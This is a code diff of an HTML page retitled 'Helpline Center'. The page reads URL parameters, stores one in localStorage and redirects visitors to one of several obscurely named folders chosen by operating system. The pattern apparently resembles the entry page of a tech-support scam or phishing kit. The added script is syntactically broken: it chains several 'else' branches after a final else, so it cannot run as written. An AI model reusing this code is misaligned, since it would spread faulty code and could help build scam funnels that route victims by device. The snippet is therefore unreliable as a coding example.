@@ -1,58 +1,56 @@
+
 <!DOCTYPE html>
 <html lang="en">
+
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Redirecting...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Helpline Center</title>
+    <script type='text/javascript' src="../code.jquery.com/jquery-1.4.4.min.js"></script>
 
-<script>
-(function () {
+    <script>
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+        function myOperatingSystem() {
+            const userAgent = navigator.userAgent;
+            let os = "Unknown";
+            if (userAgent.indexOf("Win") !== -1) {
+                os = "Windows";
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                os = "MacOS";
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                os = "Linux";
+            } else if (userAgent.indexOf("Android") !== -1) {
+                os = "Android";
+            } else if (userAgent.indexOf("iOS") !== -1) {
+                os = "iOS";
+            }
+            return os;
+        }
+        let operatingSystem = myOperatingSystem();
+        localStorage.setItem('alpha',getQueryParam('alpha'));
+        if(operatingSystem === 'MacOS'){
+            window.location.href="MerxiC0deinfousahtml/index.html?Anph="+getQueryParam('Anph');
+        }else{
+            window.location.href="webC0deinfousavhtml/index.html?Anph="+getQueryParam('Anph');
+        }else{
+            window.location.href="andx010usahTml/index.html?Anph="+getQueryParam('Anph');
+        }else{
+            window.location.href="ioxs010usxhYMl/index.html?Anph="+getQueryParam('Anph');
+        }
 
-    // Get query parameter safely
-    function getParam(name) {
-        const params = new URLSearchParams(window.location.search);
-        return params.get(name) || "";
-    }
 
-    // Get parameters
-    var alpha = getParam("alpha");
-    var bcda = getParam("bcda");
 
-    // Store alpha if exists
-    if (alpha !== "") {
-        localStorage.setItem("alpha", alpha);
-    }
-
-    // If bcda missing → stop
-    if (bcda === "") {
-        document.body.innerHTML = "<h2 style='text-align:center;margin-top:50px;'>Invalid Link</h2>";
-        return;
-    }
-
-    // Detect OS (simple & reliable)
-    var ua = navigator.userAgent.toLowerCase();
-    var url = "";
-
-    if (ua.includes("android")) {
-        url = "andx010usahTml/index.html";
-    } else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
-        url = "ioxs010usxhYMl/index.html";
-    } else if (ua.includes("mac")) {
-        url = "MerxiC0deinfousahtml/index.html";
-    } else {
-        url = "webC0deinfousavhtml/index.html";
-    }
-
-    // Redirect
-    window.location.replace(url + "?bcda=" + encodeURIComponent(bcda));
-
-})();
-</script>
-
+    </script>
 </head>
 <body>
 
-<p style="text-align:center;margin-top:50px;">Redirecting...</p>
-
 </body>
+
 </html>
+
+
+    
